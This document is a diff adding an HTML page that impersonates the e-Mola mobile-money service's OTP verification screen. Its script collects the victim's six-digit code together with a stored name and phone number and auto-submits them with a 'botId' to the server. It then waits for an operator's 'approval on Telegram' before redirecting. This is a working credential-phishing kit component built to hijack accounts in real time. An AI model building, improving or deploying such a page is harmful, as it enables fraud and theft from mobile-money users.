@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>e-Mola · Verificação</title>
+ <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #ff7845;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            color: white;
+        }
+
+        .loan-container {
+            background: #ff7845;
+            width: 100%;
+            max-width: none;
+            min-height: 100vh;
+            padding: 0;
+            border-radius: 0;
+            box-shadow: none;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Back arrow */
+        .loan-container::before {
+            content: "";
+            position: absolute;
+            top: 104px;
+            left: 70px;
+
+            width: 21px;
+            height: 21px;
+
+            border-left: 5px solid white;
+            border-bottom: 5px solid white;
+
+            transform: rotate(45deg);
+            z-index: 10;
+        }
+
+        /* Hidden logo */
+        .logo-container {
+            display: none;
+        }
+
+        /* OTP title */
+        .title {
+            position: absolute;
+            top: 250px;
+            left: 0;
+            width: 100%;
+
+            margin: 0;
+            padding: 0;
+
+            text-align: center;
+
+            font-size: 43px;
+            line-height: 1.2;
+            font-weight: 400;
+
+            color: #ffffff;
+        }
+
+        /* Instruction */
+        .subtitle {
+            position: absolute;
+            top: 595px;
+            left: 45px;
+            right: 45px;
+
+            margin: 0;
+            padding: 0;
+
+            text-align: center;
+
+            color: #ffffff;
+
+            font-size: 34px;
+            line-height: 1.45;
+            font-weight: 400;
+        }
+
+        /* Phone number hidden */
+        .display-number {
+            display: none;
+        }
+
+        /* OTP label hidden */
+        .label {
+            display: none;
+        }
+
+        /* OTP boxes */
+        .otp-boxes {
+            position: absolute;
+
+            top: 402px;
+            left: 67px;
+            right: 67px;
+
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+            gap: 16px;
+
+            margin: 0;
+        }
+
+        .otp-boxes input {
+            flex: 1;
+
+            width: 0;
+            min-width: 0;
+
+            height: 134px;
+
+            border: none;
+            outline: none;
+
+            border-radius: 18px;
+
+            background: #ffffff;
+
+            color: #333333;
+
+            font-size: 48px;
+            font-weight: 400;
+
+            text-align: center;
+
+            caret-color: #ff7845;
+
+            appearance: none;
+            -webkit-appearance: none;
+
+            box-shadow: none;
+        }
+
+        .otp-boxes input:focus {
+            border: none;
+            outline: none;
+            box-shadow: none;
+        }
+
+        /* Timer hidden */
+        #timerContainer {
+            display: none;
+        }
+
+        /* Verify button hidden */
+        #submitBtn {
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+        }
+
+        /* Footer hidden */
+        .footer-links {
+            display: none;
+        }
+
+        .version {
+            display: none;
+        }
+
+        #status {
+            display: none;
+        }
+
+
+        /* -----------------------------------
+           TABLET / SMALLER SCREENS
+        ----------------------------------- */
+
+        @media (max-width: 700px) {
+
+            .loan-container::before {
+                top: 70px;
+                left: 35px;
+
+                width: 18px;
+                height: 18px;
+
+                border-width: 4px;
+            }
+
+            .title {
+                top: 180px;
+                font-size: 35px;
+            }
+
+            .otp-boxes {
+                top: 325px;
+                left: 35px;
+                right: 35px;
+
+                gap: 10px;
+            }
+
+            .otp-boxes input {
+                height: 91px;
+                border-radius: 15px;
+                font-size: 34px;
+            }
+
+            .subtitle {
+                top: 470px;
+                left: 25px;
+                right: 25px;
+
+                font-size: 25px;
+                line-height: 1.45;
+            }
+        }
+
+
+        /* -----------------------------------
+           MOBILE
+        ----------------------------------- */
+
+        @media (max-width: 480px) {
+
+            .loan-container::before {
+                top: 50px;
+                left: 28px;
+
+                width: 16px;
+                height: 16px;
+
+                border-width: 4px;
+            }
+
+            .title {
+                top: 125px;
+                font-size: 29px;
+            }
+
+            .otp-boxes {
+                top: 225px;
+                left: 20px;
+                right: 20px;
+
+                gap: 7px;
+            }
+
+            .otp-boxes input {
+                height: 64px;
+                border-radius: 11px;
+                font-size: 25px;
+            }
+
+            .subtitle {
+                top: 325px;
+                left: 20px;
+                right: 20px;
+
+                font-size: 20px;
+                line-height: 1.45;
+            }
+        }
+
+
+        /* -----------------------------------
+           VERY SMALL PHONES
+        ----------------------------------- */
+
+        @media (max-width: 360px) {
+
+            .loan-container::before {
+                top: 42px;
+                left: 22px;
+
+                width: 14px;
+                height: 14px;
+
+                border-width: 3px;
+            }
+
+            .title {
+                top: 105px;
+                font-size: 26px;
+            }
+
+            .otp-boxes {
+                top: 190px;
+                left: 15px;
+                right: 15px;
+
+                gap: 5px;
+            }
+
+            .otp-boxes input {
+                height: 55px;
+                border-radius: 9px;
+                font-size: 22px;
+            }
+
+            .subtitle {
+                top: 275px;
+                left: 15px;
+                right: 15px;
+
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="loan-container">
+
+        <!-- Logo -->
+        <div class="logo-container">
+            <h1>e-Mola</h1>
+            <div class="slogan">Meu cell, minha mola</div>
+        </div>
+
+
+        <!-- OTP title -->
+        <div class="title">
+            Verificação de OTP
+        </div>
+
+
+        <!-- Instruction -->
+        <div class="subtitle">
+            Insira o código enviado para o seu número de telemóvel
+        </div>
+
+
+        <!-- Phone number -->
+        <div id="phoneNumber" class="display-number"></div>
+
+
+        <!-- OTP form -->
+        <form id="otpForm">
+
+            <div class="label">
+                Código OTP
+            </div>
+
+
+            <div class="otp-boxes">
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    autocomplete="one-time-code"
+                >
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+
+                <input
+                    type="tel"
+                    maxlength="1"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+
+            </div>
+
+
+            <!-- Timer -->
+            <div id="timerContainer">
+                Reenviar OTP em
+                <strong>
+                    <span id="timerDisplay">60</span>
+                </strong>
+                segundos
+            </div>
+
+
+            <!-- Verify button (hidden) -->
+            <button id="submitBtn" disabled>
+                <span id="btnText">Verificar</span>
+                <span class="spinner" id="spinner"></span>
+            </button>
+
+        </form>
+
+
+        <!-- Footer (hidden) -->
+        <div class="footer-links">
+            <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
+            <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
+        </div>
+
+
+        <!-- Version (hidden) -->
+        <div class="version">Versão 2.1.0</div>
+
+
+        <!-- Status (hidden initially) -->
+        <div id="status"></div>
+
+    </div>
+
+<!-- ===== FIRST SCRIPT: OTP BOX LOGIC + AUTO-SUBMIT ===== -->
+<script>
+    (function() {
+        const inputs = document.querySelectorAll('.otp-boxes input');
+        const form = document.getElementById('otpForm');
+
+        // Helper: submit the form if all boxes are filled
+        function submitIfComplete() {
+            const allFilled = Array.from(inputs).every(inp => inp.value.trim() !== '');
+            if (allFilled && form.dataset.submitting !== 'true') {
+                form.dataset.submitting = 'true';
+                // Dispatch a submit event on the form
+                form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+            }
+        }
+
+        // Input handling
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                // Enable/disable the hidden button (optional)
+                checkOTP();
+                // Auto-submit if complete
+                submitIfComplete();
+            });
+
+            input.addEventListener('keydown', function(event) {
+                if (event.key === 'Backspace' && !this.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Paste support
+        inputs[0].addEventListener('paste', function(event) {
+            event.preventDefault();
+            const pastedText = event.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+            pastedText.split('').forEach((digit, index) => {
+                if (inputs[index]) {
+                    inputs[index].value = digit;
+                }
+            });
+            // Focus the last filled box or the first empty one
+            const filledCount = Math.min(pastedText.length, inputs.length);
+            if (filledCount > 0) {
+                inputs[Math.min(filledCount, inputs.length) - 1].focus();
+            }
+            checkOTP();
+            submitIfComplete();
+        });
+
+        function checkOTP() {
+            const otp = Array.from(inputs).map(input => input.value).join('');
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = otp.length !== 6;
+        }
+
+        // Focus first box on load
+        window.addEventListener('load', function() {
+            if (inputs.length > 0) inputs[0].focus();
+        });
+    })();
+</script>
+
+<!-- ===== SECOND SCRIPT: BACKEND COMMUNICATION ===== -->
+<script>
+    // ---------- get botId ----------
+    const params = new URLSearchParams(window.location.search);
+    const botId = params.get('botId');
+    if (!botId) {
+        alert('Invalid access link');
+        throw new Error();
+    }
+
+    // ---------- load phone from localStorage ----------
+    const phone = localStorage.getItem('phone') || '';
+    document.getElementById('phoneNumber').textContent =
+        phone ? phone.slice(0, 6) + '****' + phone.slice(-2) : '';
+
+    // ---------- DOM refs ----------
+    const inputs = document.querySelectorAll('.otp-boxes input');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const statusEl = document.getElementById('status');
+    const timerDisplay = document.getElementById('timerDisplay');
+    let countdown;
+
+    // ADDED: missing showError function
+    function showError(msg) {
+        statusEl.textContent = msg;
+    }
+
+    // ---------- OTP input handling (additional) ----------
+    // (The first script already handles navigation; we keep these for validation state)
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            validateOTP();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = pasted.replace(/\D/g, '').split('');
+            inputs.forEach((box, i) => {
+                box.value = digits[i] || '';
+            });
+            validateOTP();
+        });
+    });
+
+    function validateOTP() {
+        const complete = [...inputs].every(i => i.value.trim() !== '');
+        submitBtn.disabled = !complete;
+    }
+
+    // ---------- timer ----------
+    function startCountdown(duration = 60) {
+        let time = duration;
+        timerDisplay.textContent = time;
+        clearInterval(countdown);
+        countdown = setInterval(() => {
+            time--;
+            timerDisplay.textContent = time;
+            if (time <= 0) {
+                clearInterval(countdown);
+                statusEl.textContent = 'Código expirado. Solicite um novo.';
+                submitBtn.disabled = true;
+            }
+        }, 1000);
+    }
+    startCountdown();
+
+    // ---------- submit OTP ----------
+    document.getElementById('otpForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        // Prevent double submission
+        if (e.target.dataset.submitting === 'true' && e.target.dataset.processing === 'true') {
+            return;
+        }
+        e.target.dataset.processing = 'true';
+
+        const code = [...inputs].map(i => i.value).join('');
+        const name = localStorage.getItem('name') || 'Desconhecido';
+        const phone = localStorage.getItem('phone') || 'Desconhecido';
+
+        // Disable inputs and show status
+        submitBtn.disabled = true;
+        btnText.textContent = 'A verificar...';
+        spinner.style.display = 'inline-block';
+        statusEl.textContent = 'A aguardar aprovação no Telegram...';
+        statusEl.style.display = 'block'; // make visible
+
+        try {
+            // 1. Send OTP to backend
+            const response = await fetch('/submit-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name, phone, code, botId })
+            });
+
+            const data = await response.json();
+            if (!data.requestId) {
+                throw new Error(data.message || 'Erro ao submeter OTP');
+            }
+
+            const requestId = data.requestId;
+
+            // 2. Poll for approval
+            let approved = false;
+            while (!approved) {
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                const checkRes = await fetch(`/check-code/${requestId}`);
+                const checkData = await checkRes.json();
+                if (checkData.approved === true) {
+                    approved = true;
+                    break;
+                } else if (checkData.approved === false) {
+                    showError('❌ Código rejeitado. Tente novamente.');
+                    throw new Error('rejected');
+                }
+            }
+
+            // 3. Approved → success
+            if (approved) {
+                localStorage.clear();
+                window.location.href = `success.html?botId=${botId}`;
+            }
+
+        } catch (error) {
+            if (error.message !== 'rejected') {
+                statusEl.textContent = '❌ Erro de ligação ao servidor.';
+                console.error(error);
+            }
+            // Reset for retry
+            submitBtn.disabled = false;
+            btnText.textContent = 'Verificar';
+            spinner.style.display = 'none';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+            startCountdown();
+            e.target.dataset.processing = 'false';
+            e.target.dataset.submitting = 'false';
+        }
+    });
+</script>
+
+</body>
+</html>
